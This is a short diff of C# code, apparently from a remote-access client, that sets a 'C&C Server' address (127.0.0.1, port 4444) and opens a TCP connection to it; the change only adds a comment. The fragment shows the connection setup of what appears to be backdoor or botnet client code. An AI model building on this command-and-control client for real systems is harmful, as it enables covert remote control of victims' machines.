@@ -14,7 +14,7 @@ namespace Client
             string HostName = "127.0.0.1"; //Address of C&C Server
             int prt = 4444;
 
-            String S;
+            String S; //Just a test
 
 
             TcpClient tc = new TcpClient(HostName, prt);
